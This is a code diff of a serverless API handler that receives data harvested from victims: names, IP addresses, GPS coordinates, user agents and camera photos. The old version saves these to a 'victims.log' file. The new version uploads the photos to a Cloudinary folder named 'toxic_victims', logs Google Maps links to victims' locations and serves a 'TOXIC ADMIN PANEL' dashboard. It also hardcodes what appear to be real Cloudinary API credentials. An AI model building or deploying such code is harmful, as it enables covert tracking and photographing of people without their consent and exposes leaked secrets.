@@ -1,41 +1,40 @@
-const fs = require('fs');
-const path = require('path');
+const cloudinary = require('cloudinary').v2;
+
+cloudinary.config({
+  cloud_name: 'h5lhwizs',
+  api_key: '218264176839572',
+  api_secret: 'HQeioALSxZP0xNVqmx7v_tPqODs'
+});
 
 export default async function handler(req, res) {
   if (req.method === 'POST') {
     const data = req.body;
-    const timestamp = new Date().toISOString();
-    
-    const logEntry = `\n=== ${timestamp} ===\nName: ${data.name}\nIP: ${req.headers['x-forwarded-for'] || 'N/A'}\nLocation: ${data.lat}, ${data.lon}\nUser-Agent: ${data.userAgent}\n\n`;
+    let photoUrl = 'No photo';
 
-    // Log file mein save
-    fs.appendFileSync(path.join('/tmp', 'victims.log'), logEntry);
-
-    // Photo save (base64 se)
     if (data.photo) {
-      const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
-      fs.writeFileSync(path.join('/tmp', `photo-${Date.now()}.jpg`), base64Data, 'base64');
+      try {
+        const upload = await cloudinary.uploader.upload(data.photo, {
+          folder: 'toxic_victims',
+          public_id: `victim_${Date.now()}`
+        });
+        photoUrl = upload.secure_url;
+      } catch(e) { console.error(e); }
     }
 
-    res.status(200).json({status: "logged"});
-  } else {
-    // Direct Dashboard
-    const logs = fs.existsSync(path.join('/tmp', 'victims.log')) 
-      ? fs.readFileSync(path.join('/tmp', 'victims.log'), 'utf8') 
-      : 'No victims yet...';
+    const logEntry = `\n=== ${new Date().toISOString()} ===\nName: ${data.name}\nLat: ${data.lat} Lon: ${data.lon}\nMap: https://www.google.com/maps?q=${data.lat},${data.lon}\nPhoto: ${photoUrl}\nIP: ${req.headers['x-forwarded-for'] || 'N/A'}\n\n`;
 
+    console.log(logEntry);
+
+    res.status(200).json({ok: true, photo: photoUrl});
+  } else {
     res.send(`
-      <!DOCTYPE html>
-      <html>
-      <head><title>TOXIC DASHBOARD</title>
-      <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}</style>
-      </head>
-      <body>
+      <html><head><title>TOXIC DASHBOARD</title>
+      <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;} a{color:#0ff;}</style>
+      </head><body>
         <h1>🔥 TOXIC ADMIN PANEL - @Toxicadminn</h1>
-        <pre>${logs}</pre>
-        <p><a href="/api/photos" target="_blank">Photos Folder</a></p>
-      </body>
-      </html>
+        <p><strong>Live Logs → Vercel Dashboard > Functions > log</strong></p>
+        <p>Photos Cloudinary pe save ho rahi hain (permanent links).</p>
+      </body></html>
     `);
   }
 }
